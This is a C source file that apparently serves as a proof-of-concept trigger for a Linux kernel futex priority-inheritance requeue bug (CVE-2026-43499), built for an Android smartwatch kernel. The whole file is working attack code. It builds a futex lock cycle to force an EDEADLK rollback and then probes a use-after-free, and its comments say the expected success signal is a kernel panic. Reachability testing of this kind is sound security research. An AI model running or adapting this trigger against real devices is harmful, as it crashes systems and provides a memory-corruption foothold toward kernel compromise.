/* trigger_edeadlk.c — GhostLock (CVE-2026-43499) trigger / reachability test.
 *
 * Adapted from MobiusM/CVE-2026-43499 (trigger.c), arm64.
 * Goal: reach -EDEADLK on proxy-rollback (remove_waiter on the wrong task)
 * and show a dangling pi_blocked_on (UAF). NOTE: on a vulnerable kernel this
 * program ends in a KERNEL PANIC ("Unable to handle kernel write to
 * read-only memory") — that is the EXPECTED signal that the bug is reachable.
 * The panic is reversible (reboot). Run it MANUALLY, once.
 *
 * OnePlus Watch 3 (OPWWE251), kernel 5.15.185-android14-11.
 *
 * Build:
 *   CC=$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang
 *   $CC -O1 -static -pie -fPIE -o trigger_edeadlk trigger_edeadlk.c -pthread
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef FUTEX_WAIT
#define FUTEX_WAIT 0
#define FUTEX_WAKE 1
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_PRIVATE_FLAG 128
#endif

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

static uint32_t futex1 = 0;        /* plain */
static uint32_t futex2 = 0;        /* PI, owned by O (=O tid) */
static uint32_t cycle_futex = 0;   /* PI, owned by W (=W tid) */

static volatile int o_ready = 0, w_ready = 0, o_blocking = 0, w_waiting = 0, uaf_probe = 0;

static long xfutex(uint32_t *u, int op, uint32_t val, void *ts, uint32_t *u2, uint32_t v3)
{ return syscall(SYS_futex, u, op, val, ts, u2, v3); }

static void dbg(const char *s){ write(2, s, strlen(s)); }
static void dbg_long(const char *p, long v, int e){
    char b[128]; int n = snprintf(b,sizeof(b),"%s%ld errno=%d (%s)\n",p,v,e,strerror(e)); write(2,b,n);
}

static void *owner_fn(void *x){
    (void)x;
    pid_t tid = (pid_t)syscall(SYS_gettid);
    __atomic_store_n(&futex2,(uint32_t)tid,__ATOMIC_RELEASE);
    __atomic_store_n(&o_ready,1,__ATOMIC_RELEASE);
    while(!__atomic_load_n(&w_ready,__ATOMIC_ACQUIRE)) sched_yield();
    __atomic_store_n(&o_blocking,1,__ATOMIC_RELEASE);
    xfutex(&cycle_futex,FLPI,0,NULL,NULL,0);   /* blocks: O->pi_blocked_on -> cycle_futex */
    xfutex(&cycle_futex,FUPI,0,NULL,NULL,0);
    return NULL;
}

static void *waiter_fn(void *x){
    (void)x;
    pid_t tid = (pid_t)syscall(SYS_gettid);
    struct timespec ts; long r;
    while(!__atomic_load_n(&o_ready,__ATOMIC_ACQUIRE)) sched_yield();
    __atomic_store_n(&cycle_futex,(uint32_t)tid,__ATOMIC_RELEASE);
    __atomic_store_n(&w_ready,1,__ATOMIC_RELEASE);
    while(!__atomic_load_n(&o_blocking,__ATOMIC_ACQUIRE)) sched_yield();
    usleep(20000);
    __atomic_store_n(&w_waiting,1,__ATOMIC_RELEASE);
    clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec += 2;
    r = xfutex(&futex1,FWRQ,0,&ts,&futex2,0);   /* wait on futex1, target futex2 */
    dbg_long("[W] FUTEX_WAIT_REQUEUE_PI returned ",r,errno);
    for(volatile int i=0;i<200;i++) syscall(SYS_getpid);   /* thrash W stack */
    __atomic_store_n(&uaf_probe,1,__ATOMIC_RELEASE);
    usleep(500000);
    xfutex(&cycle_futex,FUPI,0,NULL,NULL,0);
    return NULL;
}

int main(void){
    pthread_t oth, wth;
    setvbuf(stderr,NULL,_IONBF,0);
    dbg("[*] CVE-2026-43499 trigger (OPWWE251 5.15.185)\n");
    dbg("[!] Note: vulnerable kernel => KERNEL PANIC (this is the success signal, a reboot is enough)\n");
    pthread_create(&oth,NULL,owner_fn,NULL);
    pthread_create(&wth,NULL,waiter_fn,NULL);
    while(!__atomic_load_n(&w_waiting,__ATOMIC_ACQUIRE)) sched_yield();
    usleep(40000);
    dbg("[M] chain: W -> futex2(O) -> cycle_futex(W) -> W\n");
    dbg("[M] firing FUTEX_CMP_REQUEUE_PI\n");
    long ret = xfutex(&futex1,FCRQ,1,(void*)(uintptr_t)1,&futex2,0);
    int err = errno;
    dbg_long("[M] FUTEX_CMP_REQUEUE_PI = ",ret,err);
    if(ret==-1 && err==EDEADLK){
        dbg("[M] EDEADLK: W->pi_blocked_on stale -> czekam na timeout W\n");
        while(!__atomic_load_n(&uaf_probe,__ATOMIC_ACQUIRE)) sched_yield();
        dbg("[M] UAF probe: FUTEX_LOCK_PI(cycle_futex)\n");
        xfutex(&cycle_futex,FLPI,0,NULL,NULL,0);
        dbg("[M] UAF probe returned (brak panicu? -> bug nieosiagalny lub zneutralizowany)\n");
        xfutex(&cycle_futex,FUPI,0,NULL,NULL,0);
    }
    pthread_join(wth,NULL);
    pthread_join(oth,NULL);
    return 0;
}
